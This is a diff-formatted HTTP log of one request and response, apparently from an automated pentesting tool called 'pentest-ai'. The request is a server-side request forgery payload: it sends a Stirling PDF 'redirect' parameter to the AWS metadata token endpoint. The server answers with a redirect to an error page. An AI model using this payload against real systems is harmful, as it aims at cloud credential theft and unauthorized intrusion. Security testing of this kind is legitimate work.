@@ -1,0 +1,22 @@
+REQUEST:
+GET https://stirling-pdf.baliprov.dev/preview?redirect=http%3A%2F%2F169.254.169.254%2Flatest%2Fapi%2Ftoken
+User-Agent: pentest-ai/1.6.2 (compatible; rv:a2cfe36ea2c0; +https://pentestai.xyz)
+X-Request-ID: 7a3f9c21-4b08-4e11-9c02-a2cfe36ea2c0
+X-aws-ec2-metadata-token-ttl-seconds: 21600
+
+
+
+RESPONSE:
+HTTP 302
+Date: Wed, 25 Nov 2026 00:25:32 GMT
+Content-Length: 0
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 0
+Pragma: no-cache
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Frame-Options: DENY
+Cache-Control: must-revalidate,no-cache,no-store
+Vary: Access-Control-Request-Headers
+Location: /error?
+
